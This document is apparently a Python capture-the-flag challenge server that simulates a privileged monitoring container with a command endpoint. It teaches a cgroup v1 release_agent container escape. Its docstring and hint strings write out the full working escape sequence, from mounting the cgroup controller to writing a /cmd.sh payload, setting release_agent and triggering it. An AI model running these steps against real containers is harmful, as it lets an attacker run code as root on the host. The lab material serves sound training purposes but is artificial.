#!/usr/bin/env python3
"""
Matryoshka: container escape via cgroup v1 release_agent.

A privileged monitoring container exposes a command execution endpoint
used for administrative diagnostics. Because the container is privileged,
it can mount cgroup filesystems and configure a release_agent that the
kernel runs on the host when a cgroup is destroyed.

Escape sequence:
  1. Mount the cgroup v1 memory controller inside the container.
  2. Create a child cgroup and enable notify_on_release.
  3. Write a payload script path to release_agent.
  4. Move a process into the child cgroup, then destroy it.
  5. The kernel fires release_agent as root on the host filesystem.
  6. Read the output file the payload wrote.
"""
import json
import re
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

# Global escape state machine (single-student, resets on container restart)
_state = {"stage": "INIT", "agent_script": ""}


def _advance(cmd: str) -> dict:
    stage = _state["stage"]

    # Stage: INIT -> MOUNTED
    # Detect mount cgroup command
    if stage == "INIT":
        if re.search(r"mount.*-t\s+cgroup|mount.*cgroup.*memory", cmd):
            _state["stage"] = "MOUNTED"
            return {
                "output": (
                    "mkdir: created directory '/tmp/cgrp'\n"
                    "                                        \n"
                    "$ mount -t cgroup -o memory cgroup /tmp/cgrp\n"
                    "[  OK  ] cgroup memory controller mounted at /tmp/cgrp\n"
                    "$ ls /tmp/cgrp\n"
                    "cgroup.clone_children  cgroup.event_control  cgroup.procs\n"
                    "cgroup.sane_behavior   memory.failcnt        memory.limit_in_bytes\n"
                    "notify_on_release      release_agent          tasks"
                ),
                "stage": "MOUNTED",
            }
        # Detect just the mkdir before mount
        if re.search(r"mkdir.*cgrp", cmd):
            return {
                "output": "mkdir: created directory '/tmp/cgrp'",
                "stage": stage,
                "hint": "Now mount the cgroup memory controller: mount -t cgroup -o memory cgroup /tmp/cgrp",
            }

    # Stage: MOUNTED -> NOTIFY
    # Detect child cgroup creation and notify_on_release
    if stage == "MOUNTED":
        if "notify_on_release" in cmd:
            _state["stage"] = "NOTIFY"
            return {
                "output": (
                    "mkdir: created directory '/tmp/cgrp/x'\n"
                    "$ echo 1 > /tmp/cgrp/x/notify_on_release\n"
                    "$ cat /tmp/cgrp/x/notify_on_release\n"
                    "1\n"
                    "notify_on_release enabled. When this cgroup is emptied, the kernel\n"
                    "will execute the path stored in /tmp/cgrp/release_agent."
                ),
                "stage": "NOTIFY",
            }
        # Also handle proc/mounts / host path enumeration from MOUNTED
        if re.search(r"proc.mounts|upperdir|overlay", cmd):
            return {
                "output": (
                    "overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/"
                    "l/ABCDEF,upperdir=/var/lib/docker/overlay2/abcdef123456/diff,"
                    "workdir=/var/lib/docker/overlay2/abcdef123456/work 0 0"
                ),
                "stage": stage,
            }

    # Stage: NOTIFY -> AGENT
    # Detect release_agent configuration (and implicit script write)
    if stage == "NOTIFY":
        if "release_agent" in cmd:
            m = re.search(r"echo\s+([^\s>]+)\s*>\s*/tmp/cgrp/release_agent", cmd)
            agent = m.group(1) if m else "/cmd.sh"
            _state["agent_script"] = agent
            _state["stage"] = "AGENT"
            return {
                "output": (
                    f"$ echo '{agent}' > /tmp/cgrp/release_agent\n"
                    f"$ cat /tmp/cgrp/release_agent\n"
                    f"{agent}\n"
                    "release_agent configured. The kernel will execute this path as root\n"
                    "on the host when the cgroup is emptied."
                ),
                "stage": "AGENT",
            }
        # Script write step (printf / echo / chmod) - stay in NOTIFY
        if re.search(r"printf|chmod.*cmd|>/cmd", cmd):
            return {
                "output": (
                    "Script written to /cmd.sh\n"
                    "$ chmod +x /cmd.sh"
                ),
                "stage": stage,
                "hint": "Now point release_agent at the script: echo /cmd.sh > /tmp/cgrp/release_agent",
            }
        if re.search(r"proc.mounts|upperdir|overlay", cmd):
            return {
                "output": (
                    "overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/"
                    "l/ABCDEF,upperdir=/var/lib/docker/overlay2/abcdef123456/diff,"
                    "workdir=/var/lib/docker/overlay2/abcdef123456/work 0 0"
                ),
                "stage": stage,
            }

    # Stage: AGENT -> TRIGGERED
    # Detect cgroup.procs write (puts a process in the child cgroup, then it exits)
    if stage == "AGENT":
        if "cgroup.procs" in cmd:
            _state["stage"] = "TRIGGERED"
            agent = _state.get("agent_script") or "/cmd.sh"
            return {
                "output": (
                    f"$ sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'\n"
                    "Process added to child cgroup. Shell exited. Cgroup now empty.\n"
                    "[kernel] notify_on_release fired: running release_agent as root on host\n"
                    f"[kernel] execve({agent!r}) -> exit 0\n"
                    "Payload executed. Output written to /tmp/escape_output.txt."
                ),
                "stage": "TRIGGERED",
            }

    # Stage: TRIGGERED -> flag
    # Detect reading the output file
    if stage == "TRIGGERED":
        if re.search(r"cat\s+/tmp/escape_output|cat\s+.*escape_output", cmd):
            flag = open("/flag.txt").read().strip()
            _state["stage"] = "INIT"
            return {
                "output": flag,
                "stage": "ESCAPED",
            }
        # Also accept direct flag path reads that come after the escape
        if re.search(r"cat\s+/flag\.txt|/flag\.txt", cmd):
            flag = open("/flag.txt").read().strip()
            _state["stage"] = "INIT"
            return {
                "output": flag,
                "stage": "ESCAPED",
            }

    # Baseline: simulate safe read-only commands regardless of stage
    if re.search(r"^(id|whoami)\s*$", cmd.strip()):
        return {"output": "uid=0(root) gid=0(root) groups=0(root)", "stage": stage}
    if re.search(r"^uname", cmd.strip()):
        return {"output": "Linux matryoshka 5.15.0-generic #101-Ubuntu SMP x86_64 GNU/Linux", "stage": stage}
    if re.search(r"ls\s+/sys/fs/cgroup", cmd):
        return {
            "output": (
                "blkio  cpu  cpuacct  cpuset  devices  freezer\n"
                "hugetlb  memory  net_cls  net_prio  perf_event  pids"
            ),
            "stage": stage,
        }
    if re.search(r"ls\s+/tmp/cgrp\b", cmd):
        if stage in ("MOUNTED", "NOTIFY", "AGENT", "TRIGGERED"):
            return {
                "output": (
                    "cgroup.clone_children  memory.failcnt  memory.limit_in_bytes\n"
                    "notify_on_release      release_agent   tasks  x/"
                ),
                "stage": stage,
            }
    if re.search(r"^ls\b", cmd.strip()):
        return {"output": "app.py", "stage": stage}
    if re.search(r"^(cat|head)\s+/proc/mounts", cmd.strip()):
        return {
            "output": (
                "overlay / overlay rw,relatime,"
                "lowerdir=/var/lib/docker/overlay2/l/ABCDEF,"
                "upperdir=/var/lib/docker/overlay2/abcdef123456/diff,"
                "workdir=/var/lib/docker/overlay2/abcdef123456/work 0 0\n"
                "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
                "tmpfs /tmp tmpfs rw,nosuid,nodev 0 0"
            ),
            "stage": stage,
        }

    # Blocked: direct flag reads before the escape
    if re.search(r"cat\s+/flag", cmd):
        return {
            "output": "cat: /flag.txt: Permission denied",
            "stage": stage,
            "hint": get_hint(stage),
        }

    # Unknown command: return generic hint
    return {
        "output": f"[stage: {stage}] command noted",
        "stage": stage,
        "hint": get_hint(stage),
    }


def get_hint(stage: str) -> str:
    hints = {
        "INIT": (
            "Mount the cgroup v1 memory controller: "
            "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp"
        ),
        "MOUNTED": (
            "Create a child cgroup and enable notification: "
            "mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release"
        ),
        "NOTIFY": (
            "Write a payload script, then set release_agent: "
            "printf '#!/bin/sh\\ncat /flag.txt > /tmp/escape_output.txt\\n' > /cmd.sh "
            "&& chmod +x /cmd.sh && echo /cmd.sh > /tmp/cgrp/release_agent"
        ),
        "AGENT": (
            "Fire the escape: "
            "sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'"
        ),
        "TRIGGERED": "Read the output: cat /tmp/escape_output.txt",
    }
    return hints.get(stage, "")


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def send_json(self, code: int, data: dict):
        b = json.dumps(data, indent=2).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)

        if path == "/":
            self.send_json(200, {
                "service": "MatryoshkaMonitor v2.1",
                "description": "Infrastructure diagnostics console (privileged)",
                "endpoints": [
                    "GET  /execute?cmd=<shell_command>",
                    "GET  /info",
                ],
            })
            return

        if path == "/info":
            self.send_json(200, {
                "container": "privileged",
                "pid_namespace": "host",
                "cgroup_version": "v1",
                "note": (
                    "This container runs privileged to support low-level "
                    "infrastructure diagnostics."
                ),
            })
            return

        if path == "/execute":
            cmd = params.get("cmd", [""])[0]
            if not cmd:
                self.send_json(400, {"error": "cmd parameter required"})
                return
            result = _advance(cmd)
            self.send_json(200, {"cmd": cmd, **result})
            return

        self.send_json(404, {"error": "not found"})


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
